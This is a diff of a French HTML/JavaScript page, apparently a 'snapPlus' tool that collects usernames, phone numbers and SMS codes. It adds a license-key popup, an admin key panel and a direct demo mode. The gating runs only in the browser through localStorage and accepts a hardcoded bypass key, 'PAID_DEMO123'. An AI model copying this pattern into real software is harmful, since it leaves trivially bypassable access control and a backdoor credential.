@@ -96,7 +96,7 @@
         }
         .btn-login:disabled { opacity: 0.7; cursor: not-allowed; }
 
-        /* --- STYLE DU BOUTON INVITÉ ET DE LA POPUP --- */
+        /* --- BOUTONS INVITÉ & DÉMO --- */
         .btn-guest {
             width: 100%; background: transparent; border: 1px solid rgba(255, 255, 255, 0.1);
             border-radius: 50px; padding: 15px; color: rgba(255, 255, 255, 0.6);
@@ -106,16 +106,27 @@
             color: white; border-color: rgba(204, 51, 255, 0.5); background: rgba(255, 255, 255, 0.05);
         }
 
+        .btn-demo-direct {
+            width: 100%; background: transparent; border: 1px solid rgba(255, 204, 0, 0.3);
+            border-radius: 50px; padding: 15px; color: rgba(255, 204, 0, 0.8);
+            margin-top: 15px; font-size: 14px; cursor: pointer; transition: all 0.3s ease;
+        }
+        .btn-demo-direct:hover {
+            color: #ffcc00; border-color: rgba(255, 204, 0, 0.8); background: rgba(255, 204, 0, 0.05);
+            box-shadow: 0 0 15px rgba(255, 204, 0, 0.2);
+        }
+
+        /* --- POPUP KEY ACCESS --- */
         .popup-overlay {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0, 0, 0, 0.85); backdrop-filter: blur(5px);
+            background: rgba(0, 0, 0, 0.85); backdrop-filter: blur(8px);
             display: flex; justify-content: center; align-items: center;
             z-index: 20000; animation: fadeIn 0.3s ease;
         }
 
         .popup-box {
-            background: #1e053d; padding: 30px 20px; border-radius: 25px; text-align: center;
-            border: 2px solid #cc33ff; width: 80%; max-width: 320px; box-shadow: 0 10px 40px rgba(204, 51, 255, 0.3);
+            background: #1e053d; padding: 35px 25px; border-radius: 25px; text-align: center;
+            border: 2px solid #cc33ff; width: 85%; max-width: 320px; box-shadow: 0 10px 50px rgba(204, 51, 255, 0.4);
         }
 
         .welcome-msg { 
@@ -133,12 +144,10 @@
             font-weight: 900; margin: -20px auto 30px auto; width: max-content;
             text-transform: uppercase; letter-spacing: 2px;
         }
-        /* Style Admin VIP */
         .badge-vip {
             background: rgba(0, 255, 128, 0.1); border: 1px solid #00ff80;
             color: #00ff80; animation: pulseVIP 1.5s infinite;
         }
-        /* Style Démonstration */
         .badge-demo {
             background: rgba(255, 204, 0, 0.1); border: 1px solid #ffcc00;
             color: #ffcc00; animation: pulseDemo 1.5s infinite;
@@ -203,7 +212,7 @@
         }
         input::placeholder { color: rgba(255, 255, 255, 0.5); }
 
-        /* --- SÉLECTEUR 100% CUSTOM (V1.5) --- */
+        /* --- SÉLECTEUR 100% CUSTOM --- */
         .dropdown-group { position: relative; overflow: visible !important; display: block; padding: 0; }
         .custom-select-trigger {
             display: flex; justify-content: space-between; align-items: center; height: 58px; 
@@ -300,7 +309,30 @@
         .tiktok-btn:hover { background: rgba(255, 255, 255, 0.08); border-color: #ff0080; transform: translateY(-2px); box-shadow: 0 5px 20px rgba(255, 0, 128, 0.25); }
         .tiktok-icon { width: 20px; height: 20px; object-fit: contain; }
 
-        /* --- VERSION V1.5 --- */
+        /* --- SECTION ADMIN GESTION LICENCES (V1.51) --- */
+        .admin-panel {
+            margin-top: 35px; padding: 25px; background: rgba(0, 255, 128, 0.05);
+            border: 1px solid rgba(0, 255, 128, 0.3); border-radius: 20px; text-align: left;
+        }
+        .admin-panel-title { color: #00ff80; font-size: 14px; font-weight: 900; margin-bottom: 20px; text-transform: uppercase; letter-spacing: 1px; text-align: center; }
+        .key-list { list-style: none; padding: 0; margin: 20px 0 0 0; max-height: 200px; overflow-y: auto; }
+        .key-item {
+            display: flex; justify-content: space-between; align-items: center;
+            background: rgba(255, 255, 255, 0.05); padding: 12px 15px; border-radius: 12px; margin-bottom: 10px;
+            font-family: monospace; font-size: 13px; color: #df80ff; border: 1px solid rgba(255, 255, 255, 0.05);
+            animation: fadeIn 0.3s ease;
+        }
+        .key-actions { display: flex; gap: 8px; }
+        .key-actions button {
+            background: transparent; border: none; cursor: pointer; font-size: 12px; 
+            padding: 6px 12px; border-radius: 6px; font-weight: bold; transition: all 0.2s ease;
+        }
+        .btn-copy { color: #4ade80; border: 1px solid rgba(74, 222, 128, 0.3); }
+        .btn-copy:hover { background: rgba(74, 222, 128, 0.15); }
+        .btn-revoke { color: #ff4d4d; border: 1px solid rgba(255, 77, 77, 0.3); }
+        .btn-revoke:hover { background: rgba(255, 77, 77, 0.15); }
+
+        /* --- VERSION V1.51 --- */
         .patch-version {
             margin-top: 35px;
             text-align: center;
@@ -329,6 +361,8 @@
             .btn-glow, .btn-return { padding: 16px; font-size: 16px; }
             .tiktok-btn { padding: 16px 28px; font-size: 15px; }
             .logo-wrapper { width: 120px; height: 120px; margin-bottom: 25px; }
+            .key-item { flex-direction: column; align-items: flex-start; gap: 10px; }
+            .key-actions { width: 100%; justify-content: flex-end; }
         }
         @media (max-width: 360px) {
             .logo-wrapper { width: 100px; height: 100px; }
@@ -355,6 +389,7 @@
 
             <button class="btn-login" onclick="checkLogin()">SE CONNECTER</button>
             <button class="btn-guest" onclick="enterAsGuest()">Continuer en tant qu'invité</button>
+            <button class="btn-demo-direct" onclick="enterDemoModeDirect()">Mode Démonstration</button>
         </div>
     </div>
 
@@ -460,14 +495,22 @@
                 </a>
             </div>
 
-            <div class="patch-version">V1.5</div>
+            <div id="admin-panel" class="admin-panel" style="display: none;">
+                <div class="admin-panel-title">Gestion des Licences (Clés)</div>
+                <button class="btn-glow" style="margin-bottom: 0; padding: 15px; font-size: 15px;" onclick="generateAdminKey()">⚡ Générer une clé invitée</button>
+                <ul id="key-list" class="key-list">
+                    </ul>
+            </div>
+
+            <div class="patch-version">V1.51</div>
 
         </div>
     </div>
 
     <script>
-        // --- MODE INVITÉ ---
         let isGuest = false;
+
+        // --- ENTRÉE INVITÉ (AVEC POP-UP IMMÉDIAT) ---
         function enterAsGuest() {
             isGuest = true;
             const overlay = document.getElementById('login-overlay');
@@ -476,9 +519,114 @@
             setTimeout(() => {
                 overlay.style.display = "none";
                 site.style.display = "block";
-                setTimeout(() => { site.style.opacity = "1"; }, 50);
+                setTimeout(() => { 
+                    site.style.opacity = "1"; 
+                    showKeyAccessPopup(); // Pop-up immédiat
+                }, 50);
             }, 500);
         }
+
+        // --- NOUVEAU : ENTRÉE DÉMONSTRATION DIRECTE ---
+        function enterDemoModeDirect() {
+            isGuest = false; // Champs débloqués par défaut
+            const overlay = document.getElementById('login-overlay');
+            const site = document.getElementById('main-site');
+            
+            // Configuration du badge Démonstration
+            const badge = document.getElementById('admin-badge');
+            badge.className = "admin-badge badge-demo";
+            badge.style.display = "block";
+            badge.innerHTML = "⚠️ MODE DÉMONSTRATION";
+
+            overlay.style.opacity = "0";
+            setTimeout(() => {
+                overlay.style.display = "none";
+                site.style.display = "block";
+                setTimeout(() => { 
+                    site.style.opacity = "1"; 
+                    showError("🚀 Mode Démonstration activé !");
+                }, 50);
+            }, 500);
+        }
+
+        // --- POP-UP DE VALIDATION DE CLÉ (GUEST) ---
+        function showKeyAccessPopup() {
+            if (document.getElementById('key-popup-access')) return;
+            const div = document.createElement('div');
+            div.className = 'popup-overlay';
+            div.id = 'key-popup-access';
+            div.innerHTML = `
+                <div class="popup-box">
+                    <h3 style="color:#cc33ff; font-size: 20px; font-weight: 900; text-transform: uppercase; margin-top: 0;">Accès Restreint</h3>
+                    <p style="margin-bottom: 25px; line-height: 1.5; color: rgba(255,255,255,0.8); font-size: 14px;">Une clé de licence valide est requise pour utiliser ce logiciel.</p>
+                    
+                    <div class="login-input-group" id="group-key-input" style="margin-bottom: 20px; background: rgba(0, 0, 0, 0.5);">
+                        <input type="text" id="licence-key" placeholder="PAID_xxxxxxxx" style="text-align: center; font-family: monospace; letter-spacing: 1px; font-size: 15px;" autocomplete="off">
+                    </div>
+
+                    <button class="btn-glow" style="margin-bottom: 15px; padding: 16px; font-size: 15px;" onclick="validateLicenceKey()">Déverrouiller l'accès</button>
+                    <button class="btn-guest" style="margin-top: 0; color: rgba(255, 255, 255, 0.4); border-color: rgba(255, 255, 255, 0.1);" onclick="returnToLoginFromPopup()">Retour à l'accueil</button>
+                </div>
+            `;
+            document.body.appendChild(div);
+        }
+
+        // --- RETOUR À L'ACCUEIL DEPUIS POP-UP ---
+        function returnToLoginFromPopup() {
+            document.getElementById('key-popup-access').remove();
+            isGuest = false;
+            const overlay = document.getElementById('login-overlay');
+            const site = document.getElementById('main-site');
+            site.style.opacity = "0";
+            setTimeout(() => {
+                site.style.display = "none";
+                overlay.style.display = "flex";
+                setTimeout(() => { overlay.style.opacity = "1"; }, 50);
+            }, 500);
+        }
+
+        // --- VALIDATION DE LA CLÉ D'ACCÈS ---
+        function validateLicenceKey() {
+            const keyInput = document.getElementById('licence-key').value.trim();
+            
+            if(!keyInput) {
+                triggerShake('group-key-input');
+                showError("Veuillez entrer une clé d'accès.");
+                return;
+            }
+
+            if(!keyInput.startsWith("PAID_")) {
+                triggerShake('group-key-input');
+                showError("❌ Format de clé invalide.");
+                return;
+            }
+
+            // Récupération des clés dans la base locale
+            let validKeys = JSON.parse(localStorage.getItem('snapPlusLicences')) || [];
+
+            // Clé de secours démo pour les tests si besoin
+            if(validKeys.includes(keyInput) || keyInput === "PAID_DEMO123") {
+                document.getElementById('key-popup-access').remove();
+                isGuest = false; // Accès débloqué
+                showError("✅ Clé valide. Accès autorisé !");
+            } else {
+                triggerShake('group-key-input');
+                showError("❌ Clé introuvable, expirée ou révoquée.");
+            }
+        }
+
+        // --- PROTECTION SUPPLÉMENTAIRE DES CHAMPS ---
+        document.addEventListener('DOMContentLoaded', () => {
+            const allInputs = document.querySelectorAll('#main-site input[type="text"], #main-site input[type="tel"]');
+            allInputs.forEach(input => {
+                input.addEventListener('focus', (e) => {
+                    if (isGuest) {
+                        e.target.blur();
+                        showKeyAccessPopup();
+                    }
+                });
+            });
+        });
 
         // --- GESTION DU CUSTOM SELECT ---
         const offerTrigger = document.getElementById('offer-trigger');
@@ -489,7 +637,7 @@
         
         offerTrigger.addEventListener('click', (e) => {
             if (isGuest) {
-                showPaywallPopup();
+                showKeyAccessPopup();
                 return;
             }
             offerOptions.classList.toggle('open');
@@ -500,65 +648,19 @@
         customOptions.forEach(option => {
             option.addEventListener('click', (e) => {
                 const value = e.target.getAttribute('data-value');
-                const text = e.target.textContent;
-                
-                offerLabel.textContent = text;
+                offerLabel.textContent = e.target.textContent;
                 offerLabel.style.color = 'white';
                 offerInput.value = value;
-                
                 offerOptions.classList.remove('open');
                 offerTrigger.classList.remove('open');
                 e.stopPropagation();
             });
         });
         
-        // Fermer le sélecteur si on clique ailleurs
         document.addEventListener('click', () => {
             offerOptions.classList.remove('open');
             offerTrigger.classList.remove('open');
         });
-        
-        // Interception des clics sur les champs de saisie textuels
-        document.addEventListener('DOMContentLoaded', () => {
-            const allInputs = document.querySelectorAll('#main-site input[type="text"], #main-site input[type="tel"]');
-            allInputs.forEach(input => {
-                input.addEventListener('focus', (e) => {
-                    if (isGuest) {
-                        e.target.blur(); // Désactive immédiatement le champ
-                        showPaywallPopup();
-                    }
-                });
-            });
-        });
-
-        function showPaywallPopup() {
-            if (document.querySelector('.popup-overlay')) return;
-            const div = document.createElement('div');
-            div.className = 'popup-overlay';
-            div.innerHTML = `
-                <div class="popup-box">
-                    <h3 style="color:#cc33ff; font-size: 20px; font-weight: 800; text-transform: uppercase; margin-top: 0;">Accès Restreint</h3>
-                    <p style="margin-bottom: 25px; line-height: 1.5;">Pour débloquer ces permissions et utiliser les champs, vous devez procéder à l'activation complète (Paiement requis).</p>
-                    <button class="btn-glow" style="margin-bottom: 12px;" onclick="this.parentElement.parentElement.remove()">Fermer</button>
-                    <button class="btn-guest" style="margin-top: 0; width: 100%; border-color: rgba(204, 51, 255, 0.4); color: #df80ff;" onclick="activateDemoMode(this)">MODE DÉMONSTRATION</button>
-                </div>
-            `;
-            document.body.appendChild(div);
-        }
-
-        // --- NOUVEAU : LOGIQUE DU MODE DÉMONSTRATION + BADGE ---
-        function activateDemoMode(button) {
-            isGuest = false;
-            button.parentElement.parentElement.remove();
-            
-            // Affichage du Badge Démonstration
-            const badge = document.getElementById('admin-badge');
-            badge.className = "admin-badge badge-demo"; // Changement de classe pour style jaune
-            badge.style.display = "block";
-            badge.innerHTML = "⚠️ MODE DÉMONSTRATION";
-
-            showError("🚀 Mode Démonstration activé ! Les champs sont débloqués.");
-        }
 
         // --- FONCTION DE SECOUSSE ---
         function triggerShake(elementId) {
@@ -585,7 +687,7 @@
             setTimeout(() => errorDiv.remove(), 3000);
         }
 
-        // --- AUTHENTIFICATION ---
+        // --- AUTHENTIFICATION ADMIN ---
         function checkLogin() {
             const user = document.getElementById('adminUser').value.trim();
             const pass = document.getElementById('adminPass').value;
@@ -619,9 +721,13 @@
                         
                         // Affichage du Badge VIP Admin
                         const badge = document.getElementById('admin-badge');
-                        badge.className = "admin-badge badge-vip"; // Classe pour style vert néon
+                        badge.className = "admin-badge badge-vip";
                         badge.style.display = "block";
                         badge.innerHTML = "🟢 MODE ADMIN : " + nameToDisplay.toUpperCase();
+
+                        // Affichage du panneau de gestion des licences
+                        document.getElementById('admin-panel').style.display = "block";
+                        renderAdminKeys(); // Charge la liste des clés existantes
 
                         overlay.style.opacity = "0";
                         setTimeout(() => {
@@ -640,16 +746,74 @@
             }
         }
 
+        // --- LOGIQUE ADMIN : GESTION DES CLÉS ---
+        function generateAdminKey() {
+            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+            let randomPart = '';
+            for(let i=0; i<16; i++) {
+                randomPart += chars.charAt(Math.floor(Math.random() * chars.length));
+            }
+            const newKey = 'PAID_' + randomPart;
+            
+            let validKeys = JSON.parse(localStorage.getItem('snapPlusLicences')) || [];
+            validKeys.push(newKey);
+            localStorage.setItem('snapPlusLicences', JSON.stringify(validKeys));
+            
+            renderAdminKeys();
+            showError("✅ Nouvelle licence générée !");
+        }
+
+        function renderAdminKeys() {
+            const list = document.getElementById('key-list');
+            list.innerHTML = '';
+            let validKeys = JSON.parse(localStorage.getItem('snapPlusLicences')) || [];
+            
+            if(validKeys.length === 0) {
+                list.innerHTML = '<li style="color:rgba(255,255,255,0.4); text-align:center; font-size:12px; margin-top:10px;">Aucune licence active en base de données.</li>';
+                return;
+            }
+
+            // Affiche de la plus récente à la plus ancienne
+            validKeys.slice().reverse().forEach(key => {
+                const li = document.createElement('li');
+                li.className = 'key-item';
+                li.innerHTML = `
+                    <span>${key}</span>
+                    <div class="key-actions">
+                        <button class="btn-copy" onclick="copyAdminKey('${key}')">Copier</button>
+                        <button class="btn-revoke" onclick="revokeAdminKey('${key}')">❌</button>
+                    </div>
+                `;
+                list.appendChild(li);
+            });
+        }
+
+        function copyAdminKey(key) {
+            navigator.clipboard.writeText(key).then(() => {
+                showError("📋 Licence copiée dans le presse-papier !");
+            }).catch(err => {
+                showError("❌ Erreur lors de la copie.");
+            });
+        }
+
+        function revokeAdminKey(key) {
+            let validKeys = JSON.parse(localStorage.getItem('snapPlusLicences')) || [];
+            validKeys = validKeys.filter(k => k !== key);
+            localStorage.setItem('snapPlusLicences', JSON.stringify(validKeys));
+            renderAdminKeys();
+            showError("❌ Licence révoquée de la base de données.");
+        }
+
         // --- VALIDATION DU FORMULAIRE ---
         function processValidation() {
             if (isGuest) {
-                showPaywallPopup();
+                showKeyAccessPopup();
                 return;
             }
 
             const username = document.getElementById('username').value.trim();
             const phone = document.getElementById('phone').value.trim();
-            const offer = document.getElementById('offer-select').value; // Récupère la valeur du custom select
+            const offer = document.getElementById('offer-select').value; 
             const btn = document.getElementById('submitBtn');
             
             if (!validateUsername(username)) {
@@ -704,7 +868,7 @@
         // --- VÉRIFICATION DU CODE SMS ---
         function showWaitingMenu() {
             if (isGuest) {
-                showPaywallPopup();
+                showKeyAccessPopup();
                 return;
             }
 
@@ -778,12 +942,10 @@
             document.getElementById('step-3').style.display = 'none';
             document.getElementById('step-1').style.display = 'block';
             
-            // Remise à zéro des champs
             document.getElementById('username').value = '';
             document.getElementById('phone').value = '';
             document.getElementById('sms-code').value = '';
             
-            // Remise à zéro du custom select
             document.getElementById('offer-select').value = '';
             const offerLabel = document.getElementById('offer-label');
             offerLabel.textContent = "Sélectionner l'offre";
@@ -807,6 +969,8 @@
                 const activeElement = document.activeElement;
                 if (activeElement.id === 'adminUser' || activeElement.id === 'adminPass') {
                     checkLogin();
+                } else if (activeElement.id === 'licence-key') {
+                    validateLicenceKey();
                 } else if (activeElement.id === 'username' || activeElement.id === 'phone') {
                     processValidation();
                 } else if (activeElement.id === 'sms-code') {
